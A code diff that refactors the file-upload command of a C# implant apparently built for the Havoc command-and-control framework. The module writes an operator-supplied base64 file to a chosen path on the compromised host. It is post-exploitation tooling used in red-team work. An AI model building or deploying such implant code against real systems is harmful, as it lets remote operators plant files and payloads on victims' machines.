@@ -11,16 +11,20 @@ using System.Threading.Tasks;
 
 namespace HavocImplant.AgentFunctions
 {
-    public class Upload
+    public class Upload : CommandInterface
     {
-        public static void Run(Implant agent, string args, int taskId)
+        public override string Command => "upload";
+        public override bool Dangerous => false;
+        public override async Task Run(int taskId)
         {
+            Output = "";
             bool isRelativePath = false;
-            string outputLocation = args.Split(new char[] { ';' }, 2)[0].Substring(12);
+            string outputLocation = Agent.taskingInformation[taskId].taskArguments;
 
             if (outputLocation.EndsWith("\\") || string.IsNullOrEmpty(outputLocation))
             {
-                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n Please include the file name in the path to upload").Replace("\\", "\\\\"));
+                Output = "Please include the file name in the path to upload";
+                ReturnOutput(taskId);
                 return;
             }
 
@@ -29,30 +33,34 @@ namespace HavocImplant.AgentFunctions
 
             outputLocation = Path.GetFullPath(Path.Combine(new string[] { dir, outputLocation }));
 
-            //Console.WriteLine($"Parsed upload directory is {dir}");
-            //Console.WriteLine($"Output upload location is {outputLocation}");
-            byte[] fileBytes = Convert.FromBase64String(args.Split(new char[] { ';' }, 2)[1]);
-            //Console.WriteLine($"File to upload is {fileBytes.Length} bytes long");
+            byte[] fileBytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);
 
             if (Directory.Exists(dir))
             {
                 if (checkWriteAccess(dir)) //success
                 {
                     File.WriteAllBytes(outputLocation, fileBytes);
-                    if (!File.Exists(outputLocation)) agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nSomething went wrong when uploading to {outputLocation}").Replace("\\", "\\\\"));
-                    else agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nUploaded to {outputLocation} with {fileBytes.Length} bytes").Replace("\\", "\\\\"));
-                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nUploaded to {outputLocation} with {fileBytes.Length} bytes").Replace("\\", "\\\\"));
+                    if (!File.Exists(outputLocation))
+                    {
+                        Output = $"Something went wrong when uploading to {outputLocation}";
+                        ReturnOutput(taskId);
+                        return;
+                    }
+                    Output = $"Uploaded to {outputLocation} with {fileBytes.Length} bytes";
+                    ReturnOutput(taskId);
                     return;
                 }
                 else
                 {
-                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nCould not upload {outputLocation} due to lack of permissions").Replace("\\", "\\\\"));
+                    Output = $"Could not upload {outputLocation} due to lack of permissions";
+                    ReturnOutput(taskId);
                     return;
                 }
             }
             else
             {
-                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n{dir} does not exist").Replace("\\", "\\\\"));
+                Output = $"{dir} does not exist";
+                ReturnOutput(taskId);
                 return;
             }
         }
